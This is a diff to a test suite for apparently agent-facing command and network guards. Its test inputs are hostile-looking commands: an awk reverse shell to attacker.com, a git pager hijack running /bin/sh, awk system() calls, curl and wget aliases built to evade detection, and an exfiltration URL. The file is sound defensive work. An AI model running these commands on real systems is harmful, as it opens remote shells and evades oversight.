@@ -845,6 +845,50 @@ describe("ExecGuard", () => {
     expect(result.shouldBlock).toBe(true);
   });
 
+  it("detects gawk system() execution", () => {
+    const result = execGuardRule.check(makeCtx("bash", { command: "gawk 'BEGIN{system(\"whoami\")}'" }));
+    expect(result.triggered).toBe(true);
+  });
+
+  it("detects mawk system() execution", () => {
+    const result = execGuardRule.check(makeCtx("bash", { command: "mawk 'BEGIN{system(\"id\")}'" }));
+    expect(result.triggered).toBe(true);
+  });
+
+  it("detects nawk inet/tcp reverse shell", () => {
+    const result = execGuardRule.check(makeCtx("bash", { command: "nawk 'BEGIN{s=\"/inet/tcp/0/attacker.com/4444\"}'" }));
+    expect(result.triggered).toBe(true);
+  });
+
+  // ── git config command execution hook ──
+
+  it("detects git config core.pager command execution", () => {
+    const result = execGuardRule.check(makeCtx("bash", { command: "git config core.pager '/bin/sh -c bad'" }));
+    expect(result.triggered).toBe(true);
+  });
+
+  it("detects git -c core.editor override", () => {
+    const result = execGuardRule.check(makeCtx("bash", { command: "git -c core.editor=vim diff" }));
+    expect(result.triggered).toBe(true);
+  });
+
+  // ── shell alias/function evasion ──
+
+  it("detects alias for curl", () => {
+    const result = execGuardRule.check(makeCtx("bash", { command: "alias c=curl" }));
+    expect(result.triggered).toBe(true);
+  });
+
+  it("detects function wrapping wget", () => {
+    const result = execGuardRule.check(makeCtx("bash", { command: 'function dl() { wget "$@"; }' }));
+    expect(result.triggered).toBe(true);
+  });
+
+  it("does NOT flag benign alias", () => {
+    const result = execGuardRule.check(makeCtx("bash", { command: "alias ll='ls -la'" }));
+    expect(result.triggered).toBe(false);
+  });
+
   // ── sed -e flag execution ──
 
   it("detects sed s///e flag execution", () => {
@@ -1622,11 +1666,11 @@ describe("ExecGuard git credential theft", () => {
     expect(result.triggered).toBe(true);
   });
 
-  it("does NOT trigger on normal git credential-osxkeychain", () => {
+  it("detects git config --global credential.helper as potential command execution", () => {
     const result = execGuardRule.check(
       makeCtx("bash", { command: "git config --global credential.helper osxkeychain" })
     );
-    expect(result.triggered).toBe(false);
+    expect(result.triggered).toBe(true);
   });
 
   it("does NOT trigger on git clone", () => {
@@ -1636,11 +1680,11 @@ describe("ExecGuard git credential theft", () => {
     expect(result.triggered).toBe(false);
   });
 
-  it("does NOT trigger on git credential-cache helper config", () => {
+  it("detects git config credential.helper as potential command execution", () => {
     const result = execGuardRule.check(
       makeCtx("bash", { command: "git config credential.helper cache" })
     );
-    expect(result.triggered).toBe(false);
+    expect(result.triggered).toBe(true);
   });
 });
 
@@ -10436,6 +10480,31 @@ describe("NetworkGuard — ipv4only.arpa DNS bypass", () => {
     const result = rule.check(
       makeCtx("http_request", { url: "http://ipv4only.arpa/exfil" })
     );
+    expect(result.triggered).toBe(true);
+  });
+});
+
+describe("NetworkGuard — URL shortener detection", () => {
+  const rule = createNetworkGuardRule();
+
+  it("detects bit.ly URL shortener", () => {
+    const result = rule.check(makeCtx("fetch", { url: "https://bit.ly/abc123" }));
+    expect(result.triggered).toBe(true);
+    expect(result.event?.severity).toBe("medium");
+  });
+
+  it("detects tinyurl.com", () => {
+    const result = rule.check(makeCtx("web_fetch", { url: "https://tinyurl.com/xyz456" }));
+    expect(result.triggered).toBe(true);
+  });
+
+  it("detects t.co Twitter shortener", () => {
+    const result = rule.check(makeCtx("fetch", { url: "https://t.co/abc123def" }));
+    expect(result.triggered).toBe(true);
+  });
+
+  it("detects is.gd shortener", () => {
+    const result = rule.check(makeCtx("web_fetch", { url: "https://is.gd/shortcode" }));
     expect(result.triggered).toBe(true);
   });
 });
